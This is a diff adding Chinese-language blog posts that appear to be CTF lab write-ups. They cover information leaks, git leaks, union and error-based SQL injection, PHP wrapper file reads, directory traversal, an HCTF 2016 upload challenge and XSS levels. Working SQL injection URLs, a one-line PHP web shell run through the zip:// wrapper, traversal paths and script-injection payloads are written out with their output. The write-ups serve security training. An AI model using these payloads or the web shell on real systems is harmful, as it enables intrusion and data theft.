@@ -71,6 +71,460 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-CTF-wp-CTFer成长之第一章" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/05/CTF-wp-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/" class="article-date">
+  <time class="dt-published" datetime="2021-02-05T02:22:24.000Z" itemprop="datePublished">2021-02-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/05/CTF-wp-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/">wp-CTFer成长之路-第一章</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="常见的搜集1"><a href="#常见的搜集1" class="headerlink" title="常见的搜集1"></a>常见的搜集1</h1><p>首先尝试/robots.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br><span class="line">&#x2F;flag1_is_her3_fun.txt</span><br></pre></td></tr></table></figure>
+<p>访问/flag1_is_her3_fun.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag1:n1book&#123;info_1</span><br></pre></td></tr></table></figure>
+<p>其次尝试index.php~</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dd8ad7bf-b685-47dc-b67c-fbb982333f0a.node3.buuoj.cn&#x2F;index.php~</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag2:s_v3ry_im</span><br></pre></td></tr></table></figure>
+<p>最后尝试.index.php.swp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dd8ad7bf-b685-47dc-b67c-fbb982333f0a.node3.buuoj.cn&#x2F;.index.php.swp</span><br></pre></td></tr></table></figure>
+<p>下载文件后，使用vim还原</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag3:p0rtant_hack&#125;</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1book&#123;info_1s_v3ry_imp0rtant_hack&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="index-php-swp"><a href="#index-php-swp" class="headerlink" title=".index.php.swp"></a>.index.php.swp</h2><p>vim在意外退出时生成的备份文件，.swp,.swo,.swn,.un.文件名.swp</p>
+<p>恢复方法：vim -r *.swp</p>
+<p>下载方法：.文件名.swp（不要忘了前置的点</p>
+<h1 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="粗心的小李"></a>粗心的小李</h1><p>考察：githacker使用</p>
+<p>环境：python3.8 kali</p>
+<p>访问./git.config，有回显，说明有git泄露</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;3579cc56-39ac-4136-8764-1db948d401a0.node3.buuoj.cn&#x2F;.git&#x2F;config</span><br></pre></td></tr></table></figure>
+<p>使用githacker</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHacker.py http:&#x2F;&#x2F;3579cc56-39ac-4136-8764-1db948d401a0.node3.buuoj.cn&#x2F;.git</span><br></pre></td></tr></table></figure>
+<p>得到index.php，发现flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1book&#123;git_looks_s0_easyfun&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="githacker"><a href="#githacker" class="headerlink" title="githacker"></a>githacker</h2><p>注意要使用git clone下载的版本</p>
+<p>直接使用zip下载的版本，会无法使用</p>
+<h1 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="SQL注入-1"></a>SQL注入-1</h1><p>考察：union注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;1&#39; order by 4--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;-1&#39; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;-1&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">note</span><br><span class="line">fl4g,notes</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;fl4g&#39; --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">fllllag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;-1&#39; union select 1,2,fllllag from fl4g --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">n1book&#123;union_select_is_so_cool&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="sql注入-2"><a href="#sql注入-2" class="headerlink" title="sql注入-2"></a>sql注入-2</h1><p>考察：报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name: admin&#39; or 1&#x3D;1 --+</span><br><span class="line">pass: 1234</span><br></pre></td></tr></table></figure>
+<p>账号不存在</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#39;1&amp;pass&#x3D;password</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef&quot;&#125;</span><br><span class="line">name&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#39;2&amp;pass&#x3D;password</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>根据提示，在URL后接?tips=1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; and updatexml(1,concat(0x7e,SUBSTR((database()),1,24),0x7e),1) --+&amp;pass&#x3D;password</span><br><span class="line">string(28) &quot;XPATH syntax error: &#39;~note~&#39;&quot;</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u4e0d\u5b58\u5728&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>此处有一个大小写绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; and updatexml(1,concat(0x7e,SUBSTR((sElect group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;note&#39;),1,24),0x7e),1) --+&amp;pass&#x3D;password</span><br><span class="line"></span><br><span class="line">string(34) &quot;XPATH syntax error: &#39;~fl4g,users~&#39;&quot;</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u4e0d\u5b58\u5728&quot;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; and updatexml(1,concat(0x7e,SUBSTR((sElect group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;fl4g&#39;),1,24),0x7e),1) --+&amp;pass&#x3D;password</span><br><span class="line"></span><br><span class="line">string(28) &quot;XPATH syntax error: &#39;~flag~&#39;&quot;</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u4e0d\u5b58\u5728&quot;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; and updatexml(1,concat(0x7e,SUBSTR((sElect flag from fl4g),1,32),0x7e),1) --+&amp;pass&#x3D;password</span><br><span class="line"></span><br><span class="line">string(50) &quot;XPATH syntax error: &#39;~n1book&#123;login_sqli_is_nice&#125;~&#39;&quot;</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u4e0d\u5b58\u5728&quot;&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="afr-1"><a href="#afr-1" class="headerlink" title="afr_1"></a>afr_1</h1><p>考察：php://filter协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;282cc63b-b61e-4ebd-a4b0-8081ec6a6c0f.node3.buuoj.cn&#x2F;?p&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;hello</span><br><span class="line"></span><br><span class="line">PD9waHAKCmVjaG8gImhlbGxvIHdvcmxkISI7</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &quot;hello world!&quot;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;282cc63b-b61e-4ebd-a4b0-8081ec6a6c0f.node3.buuoj.cn&#x2F;?p&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</span><br><span class="line"></span><br><span class="line">PD9waHAKCmlmKGlzc2V0KCRfR0VUWydwJ10pKSB7CiAgICBpbmNsdWRlIChzdHJpbmcpJF9HRVRbJ3AnXSAuICIucGhwIjsKfQplbHNlewogICAgaGVhZGVyKCdMb2NhdGlvbjogLz9wPWhlbGxvJyk7Cn0&#x3D;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;p&#39;])) &#123;</span><br><span class="line">    include (string)$_GET[&#39;p&#39;] . &quot;.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&#39;Location: &#x2F;?p&#x3D;hello&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>猜测标的文件为flag，猜对了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;282cc63b-b61e-4ebd-a4b0-8081ec6a6c0f.node3.buuoj.cn&#x2F;?p&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag</span><br><span class="line"></span><br><span class="line">PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">die(&#39;no no no&#39;);</span><br><span class="line">&#x2F;&#x2F;n1book&#123;afr_1_solved&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="afr-2"><a href="#afr-2" class="headerlink" title="afr_2"></a>afr_2</h1><p>考察：目录穿越</p>
+<p>没有任何可以输入的点</p>
+<p>看到图片目录为/img/img.gif</p>
+<p>尝试URL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;64aee20b-6186-413c-a12c-fd0df566fa9a.node3.buuoj.cn&#x2F;img</span><br></pre></td></tr></table></figure>
+<p>网页显示目录</p>
+<p>尝试目录穿越</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;64aee20b-6186-413c-a12c-fd0df566fa9a.node3.buuoj.cn&#x2F;img..&#x2F;	</span><br></pre></td></tr></table></figure>
+<p>看到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;64aee20b-6186-413c-a12c-fd0df566fa9a.node3.buuoj.cn&#x2F;img..&#x2F;flag</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1book&#123;afr_2_solved&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="afr-3"><a href="#afr-3" class="headerlink" title="afr_3"></a>afr_3</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e814fea7-7a7d-42da-934c-bdb3b6caf1fb.node3.buuoj.cn&#x2F;article?name&#x3D;article</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e814fea7-7a7d-42da-934c-bdb3b6caf1fb.node3.buuoj.cn&#x2F;article?name&#x3D;n1page</span><br><span class="line"></span><br><span class="line">&#39;&#x2F;home&#x2F;nu11111111l&#x2F;articles&#x2F;n1page&#39;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;e814fea7-7a7d-42da-934c-bdb3b6caf1fb.node3.buuoj.cn&#x2F;article?name&#x3D;..&#x2F;..&#x2F;flag</span><br><span class="line">no permission!</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/05/CTF-wp-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/" data-id="ckktdzeq90000lgusdt037abb" data-title="wp-CTFer成长之路-第一章" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-CTFer成长之路-1-3-3-文件读取漏洞例题" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/05/CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF-1-3-3-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%BE%8B%E9%A2%98/" class="article-date">
+  <time class="dt-published" datetime="2021-02-05T00:52:51.000Z" itemprop="datePublished">2021-02-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/05/CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF-1-3-3-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%BE%8B%E9%A2%98/">CTFer成长之路_1.3.3 文件读取漏洞例题</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="1-3-3-1-兵者多诡（HCTF-2016）"><a href="#1-3-3-1-兵者多诡（HCTF-2016）" class="headerlink" title="1.3.3.1 兵者多诡（HCTF 2016）"></a>1.3.3.1 兵者多诡（HCTF 2016）</h1><p>考察：zip://伪协议，phar伪协议</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Shinpachi8/article/details/53366980">https://blog.csdn.net/Shinpachi8/article/details/53366980</a></p>
+<p>进入后，是一个文件上传页面，要求只能上传png格式图片</p>
+<p>发现URL处有fp参数（意指 file pointer），尝试在此处使用伪协议导出php文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fp&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;upload&#x2F;function</span><br></pre></td></tr></table></figure>
+<p>分别导出function、upload、home</p>
+<p>但是不知道flag的路径，需要上传一个木马</p>
+<p>发现文件上传只对content-type进行了过滤，但是上传后的文件都会被命名为png，且随机改名</p>
+<p><strong>方法1：zip伪协议</strong></p>
+<p>创建一个php文件，内容为<?php \$\_GET\['param1'\](\$\_GET['param2']); ?></p>
+<p>压缩php文件</p>
+<p>上传后，假设拿到路径+文件名为xxx</p>
+<p>发送请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fp&#x3D;zip:&#x2F;&#x2F;xxx.png%23shell&amp;param1&#x3D;system&amp;param2&#x3D;pwd</span><br></pre></td></tr></table></figure>
+<p>可得到当前目录，之后对param1和param2进行修改即可</p>
+<p><strong>方法2：phar协议</strong></p>
+<p>创建一个php文件，内容为<?php print_r(scanf('/var/www')) ?></p>
+<p>上传，假设拿到路径+文件名为xxx</p>
+<p>发送请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fp&#x3D;phar:&#x2F;&#x2F;xxx.png&#x2F;phar</span><br></pre></td></tr></table></figure>
+
+
+<p>通过以上步骤得到flag文件路径，最后显示flag文件内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fp&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;Th1s_1s_F1a9</span><br></pre></td></tr></table></figure>
+<h2 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;绝对路径%23要解压的文件&amp;参数1&#x3D;值1&amp;参数2&#x3D;值2</span><br><span class="line">?fp&#x3D;zip:&#x2F;&#x2F;xxx.png%23shell&amp;param1&#x3D;system&amp;param2&#x3D;pwd</span><br></pre></td></tr></table></figure>
+<h2 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;相对路径&#x2F;phar</span><br><span class="line">?fp&#x3D;phar:&#x2F;&#x2F;xxx.png&#x2F;phar</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/05/CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF-1-3-3-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%BE%8B%E9%A2%98/" data-id="ckktdzeqe0001lgus05g878a0" data-title="CTFer成长之路_1.3.3 文件读取漏洞例题" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-CTF-Web-XSS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/01/CTF-Web-XSS/" class="article-date">
+  <time class="dt-published" datetime="2021-02-01T01:41:04.000Z" itemprop="datePublished">2021-02-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/01/CTF-Web-XSS/">CTF-Web-XSS</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="XSS靶机"><a href="#XSS靶机" class="headerlink" title="XSS靶机"></a>XSS靶机</h1><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="comment">## 若执行了alert，则执行以下语句</span></span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;欢迎用户test&lt;/h2&gt;&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:<span class="number">4</span>&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>观察到URL为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;xss&#x2F;level1.php?name&#x3D;test</span><br></pre></td></tr></table></figure>
+<p>整个PHP文件只有URL处有输入空间，且test直接在下列语句中显示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align&#x3D;center&gt;欢迎用户test&lt;&#x2F;h2&gt;&lt;center&gt;&lt;img src&#x3D;level1.png&gt;&lt;&#x2F;center&gt;</span><br></pre></td></tr></table></figure>
+<p>审计源码，直接显示test</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;欢迎用户&quot;.$str.&quot;&lt;&#x2F;h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>故payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;xss&#x2F;level1.php?name&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>keyword在php中为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;keyword&quot; value&#x3D;&quot;test&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>审计源码，做了htmlspecialchars的过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br></pre></td></tr></table></figure>
+<p>此处无法xss</p>
+<p>还有一处用到了keyword</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str.&#39;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>需要闭合尖括号和双引号，因此payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;xss&#x2F;level2.php?keyword&#x3D;&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="php的htmlspecialchars"><a href="#php的htmlspecialchars" class="headerlink" title="php的htmlspecialchars"></a>php的htmlspecialchars</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&amp;：转换为&amp;</span><br><span class="line">&quot;：转换为&quot;</span><br><span class="line">&#39;：转换为成为 &#39;</span><br><span class="line">&lt;：转换为&lt;</span><br><span class="line">&gt;：转换为&gt;</span><br><span class="line"></span><br><span class="line">ENT_COMPAT - 默认。仅编码双引号。</span><br><span class="line">ENT_QUOTES - 编码双引号和单引号。</span><br><span class="line">ENT_NOQUOTES - 不编码任何引号。</span><br></pre></td></tr></table></figure>
+
+
